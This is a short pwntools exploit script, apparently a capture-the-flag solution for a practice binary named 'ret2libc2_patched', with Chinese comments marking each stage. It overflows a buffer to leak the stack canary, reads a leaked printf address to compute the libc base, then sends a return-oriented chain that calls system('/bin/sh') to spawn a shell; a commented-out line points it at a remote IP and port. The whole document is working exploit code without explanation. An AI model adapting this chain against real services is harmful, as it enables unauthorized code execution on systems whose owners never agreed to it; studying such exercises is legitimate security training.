from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(log_level='debug',arch='amd64',os='linux')
libc=ELF('./libc-2.35.so')
io = process("./ret2libc2_patched")
#io=remote("219.216.65.41",35862)

'''泄露canary'''

io.recv()
gdb.attach(io)
io.send(b'a'*25)
io.recvuntil(b'a'*25)
canary=u64(io.recv(7).replace(b'\n',b'').rjust(8,b'\x00'))
success(hex(canary))

'''接收泄露的printf地址'''

io.recvuntil(b'\n')
io.recvuntil(b'\n')
buf = io.recvuntil('\n')[2:14].decode().rjust(16,'0')
libcbase = int(buf,16)-libc.sym['printf']
success(hex(libcbase))
libc.address=libcbase

'''构造rop'''

payload=b'a'*24+p64(canary)+b'a'*8
payload+=flat([libc.search(asm('pop rdi; ret;')).__next__(),
               libc.search(b'/bin/sh\x00').__next__(),
               libc.search(asm('pop rsi; ret;')).__next__(),
               0,
               libc.search(asm('pop rsi; ret;')).__next__()+1,
               libc.sym['system']])
io.send(payload)

io.interactive()